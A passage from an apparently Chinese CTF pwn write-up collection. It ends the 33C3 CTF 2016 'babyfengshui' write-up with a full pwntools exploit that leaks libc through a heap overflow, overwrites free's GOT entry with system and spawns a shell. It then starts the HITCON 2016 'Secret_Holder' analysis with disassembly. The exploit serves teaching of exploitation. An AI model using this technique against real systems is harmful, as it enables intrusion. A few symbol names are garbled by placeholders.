6.1.20 pwn 33C3CTF2016 babyfengshui
该函数读入新的 text_size，并使用 (store[i]->desc + test_size) desc 为 PI:EMAIL ，从而泄漏出 libc 地址。得到 system 地址后，此时修
改第 2 个 user 的 description，其实是修改 free 的 GOT，所以我们将其改成
PI:EMAIL 。最后删除第 3 个 user，触发 system('/bin/sh')，得到 shell。
开启 ASLR。Bingo!!!
$ python exp.py
[+] Starting local process './babyfengshui': pid 2269
[*] system address: 0xf75e23e0
[*] Switching to interactive mode
$ whoami
firmy
exploit
完整的 exp 如下：
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'
1252
6.1.20 pwn 33C3CTF2016 babyfengshui
io = process(['./babyfengshui'], env={'LD_PRELOAD':'./libc-2.19.
so'})
elf = ELF('babyfengshui')
libc = ELF('libc-2.19.so')
def add_user(size, length, text):
io.sendlineafter("Action: ", '0')
io.sendlineafter("description: ", str(size))
io.sendlineafter("name: ", 'AAAA')
io.sendlineafter("length: ", str(length))
io.sendlineafter("text: ", text)
def delete_user(idx):
io.sendlineafter("Action: ", '1')
io.sendlineafter("index: ", str(idx))
def display_user(idx):
io.sendlineafter("Action: ", '2')
io.sendlineafter("index: ", str(idx))
def update_desc(idx, length, text):
io.sendlineafter("Action: ", '3')
io.sendlineafter("index: ", str(idx))
io.sendlineafter("length: ", str(length))
io.sendlineafter("text: ", text)
if __name__ == "__main__":
add_user(0x80, 0x80, 'AAAA') # 0
add_user(0x80, 0x80, 'AAAA') # 1
add_user(0x8, 0x8, '/bin/sh\x00') # 2
delete_user(0)
add_user(0x100, 0x19c, "A"*0x198 + p32(elf.got['free']))
# 0
display_user(1)
io.recvuntil("description: ")
free_addr = u32(io.recvn(4))
system_addr = free_addr - (libc.symbols['free'] - libc.symbo
ls['system'])
1253
6.1.20 pwn 33C3CTF2016 babyfengshui
log.info("system address: 0x%x" % system_addr)
update_desc(1, 0x4, p32(system_addr))
delete_user(2)
io.interactive()
参考资料
https://ctftime.org/task/3282
https://github.com/bkth/babyfengshui
1254
6.1.21 pwn HITCONCTF2016 Secret_Holder
6.1.21 pwn HITCONCTF2016 Secret_Holder
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
$ file SecretHolder
SecretHolder: ELF 64-bit LSB executable, x86-64, version 1 (SYSV
), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
for GNU/Linux 2.6.24, BuildID[sha1]=1d9395599b8df48778b25667e94e
367debccf293, stripped
$ checksec -f SecretHolder
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 0 2 SecretHo
lder
$ strings libc-2.23.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu3) stable release versio
n 2.23, by Roland McGrath et al.
Compiled by GNU CC version 5.3.1 20160413.
64 位程序，开启了 Canary 和 NX，默认开启 ASLR。
在 Ubuntu-16.04 上玩一下：
1255
6.1.21 pwn HITCONCTF2016 Secret_Holder
$ ./SecretHolder
Hey! Do you have any secret?
I can help you to hold your secrets, and no one will be able to
see it :)
1. Keep secret
2. Wipe secret
3. Renew secret
1
Which level of secret do you want to keep?
1. Small secret
2. Big secret
3. Huge secret
1
Tell me your secret:
AAAA
1. Keep secret
2. Wipe secret
3. Renew secret
3
Which Secret do you want to renew?
1. Small secret
2. Big secret
3. Huge secret
1
Tell me your secret:
BBBB
1. Keep secret
2. Wipe secret
3. Renew secret
2
Which Secret do you want to wipe?
1. Small secret
2. Big secret
3. Huge secret
1
该程序运行我们输入 small、big、huge 三种 secret，且每种 secret 只能输入一
个。通过 Renew 可以修改 secret 的内容。Wipe 用于删除 secret。
1256
6.1.21 pwn HITCONCTF2016 Secret_Holder
猜测三种 secret 应该是有不同的 chunk 大小，但程序没有我们常见的打印信息这
种选项来做信息泄漏。
题目解析
下面我们逐个来逆向这些功能。
Keep secret
[0x00400780]> pdf @ sub.Which_level_of_secret_do_you_want_to_kee
p_86d
/ (fcn) sub.Which_level_of_secret_do_you_want_to_keep_86d 442
| sub.Which_level_of_secret_do_you_want_to_keep_86d ();
| ; var int local_14h @ rbp-0x14
| ; var int local_10h @ rbp-0x10
| ; var int local_8h @ rbp-0x8
| ; CALL XREF from 0x00400d6e (main)
| 0x0040086d push rbp
| 0x0040086e mov rbp, rsp
| 0x00400871 sub rsp, 0x20
| 0x00400875 mov rax, qword fs:[0x28]
; [0x28:8]=-1 ; '(' ; 40
| 0x0040087e mov qword [local_8h], rax
| 0x00400882 xor eax, eax
| 0x00400884 mov edi, str.Which_level_of_secret_d
o_you_want_to_keep ; 0x400e28 ; "Which level of secret do you wa
nt to keep?"
| 0x00400889 call sym.imp.puts
; int puts(const char *s)
| 0x0040088e mov edi, str.1._Small_secret
; 0x400e53 ; "1. Small secret"
| 0x00400893 call sym.imp.puts
; int puts(const char *s)
| 0x00400898 mov edi, str.2._Big_secret
; 0x400e63 ; "2. Big secret"
| 0x0040089d call sym.imp.puts
; int puts(const char *s)
| 0x004008a2 mov edi, str.3._Huge_secret
1257
6.1.21 pwn HITCONCTF2016 Secret_Holder
; 0x400e71 ; "3. Huge secret"
| 0x004008a7 call sym.imp.puts
; int puts(const char *s)
| 0x004008ac lea rax, [local_10h]
| 0x004008b0 mov edx, 4
| 0x004008b5 mov esi, 0
| 0x004008ba mov rdi, rax
| 0x004008bd call sym.imp.memset
; void *memset(void *s, int c, size_t n)
| 0x004008c2 lea rax, [local_10h]
| 0x004008c6 mov edx, 4
| 0x004008cb mov rsi, rax
| 0x004008ce mov edi, 0
| 0x004008d3 mov eax, 0
| 0x004008d8 call sym.imp.read
; ssize_t read(int fildes, void *buf, size_t nbyte)
| 0x004008dd lea rax, [local_10h]
| 0x004008e1 mov rdi, rax
| 0x004008e4 call sym.imp.atoi
; int atoi(const char *str)
| 0x004008e9 mov dword [local_14h], eax
| 0x004008ec mov eax, dword [local_14h]
| 0x004008ef cmp eax, 2
; 2
| ,= 0x00400907 mov eax, dword [0x006020c0]
; small_flag，表示 small secret 是否已存在
| | || 0x0040090d test eax, eax
1258
6.1.21 pwn HITCONCTF2016 Secret_Holder
| |,=== 0x00400916 mov esi, 0x28
; '(' ; 40
| || || 0x0040091b mov edi, 1
| || || 0x00400920 call sym.imp.calloc
; calloc(1, 0x28) 为 small secret 分配空间
| || || 0x00400925 mov qword [0x006020b0], rax
; 把地址放到 [0x006020b0]
| || || 0x0040092c mov dword [0x006020c0], 1
; 设置 small_flag 为 1
| || || 0x00400936 mov edi, str.Tell_me_your_secret:
; 0x400e80 ; "Tell me your secret: "
| || || 0x0040093b call sym.imp.puts
; int puts(const char *s)
| || || 0x00400940 mov rax, qword [0x006020b0]
; [0x6020b0:8]=0
| || || 0x00400947 mov edx, 0x28
; '(' ; 40
| || || 0x0040094c mov rsi, rax
| || || 0x0040094f mov edi, 0
| || || 0x00400954 mov eax, 0
| || || 0x00400959 call sym.imp.read
; read(0, [0x006020b0], 0x28) 读入 small secret
| ||,=== 0x00400963 mov eax, dword [0x006020b8]
; big_flag，表示 big secret 是否已存在
| |||| 0x00400969 test eax, eax
| ||||,= 0x00400972 mov esi, 0xfa0
; 4000
1259
6.1.21 pwn HITCONCTF2016 Secret_Holder
| ||||| 0x00400977 mov edi, 1
| ||||| 0x0040097c call sym.imp.calloc
; calloc(1, 0xfa0) 为 big secret 分配空间
| ||||| 0x00400981 mov qword [0x006020a0], rax
; 把地址放到 [0x006020a0]
| ||||| 0x00400988 mov dword [0x006020b8], 1
; 设置 big_flag 为 1
| ||||| 0x00400992 mov edi, str.Tell_me_your_secret:
; 0x400e80 ; "Tell me your secret: "
| ||||| 0x00400997 call sym.imp.puts
; int puts(const char *s)
| ||||| 0x0040099c mov rax, qword [0x006020a0]
; [0x6020a0:8]=0
| ||||| 0x004009a3 mov edx, 0xfa0
; 4000
| ||||| 0x004009a8 mov rsi, rax
| ||||| 0x004009ab mov edi, 0
| ||||| 0x004009b0 mov eax, 0
| ||||| 0x004009b5 call sym.imp.read
; read(0, [0x006020a0], 0xfa0) 读入 big secret
| |||||,= 0x004009bc mov eax, dword [0x006020bc]
; huge_flag，表示 huge secret 是否已存在
| |||| | 0x004009c2 test eax, eax
| ||||,== 0x004009c8 mov esi, 0x61a80
| ||||| | 0x004009cd mov edi, 1
| ||||| | 0x004009d2 call sym.imp.calloc
; calloc(1, 0x61a80) 为 huge secret 分配空间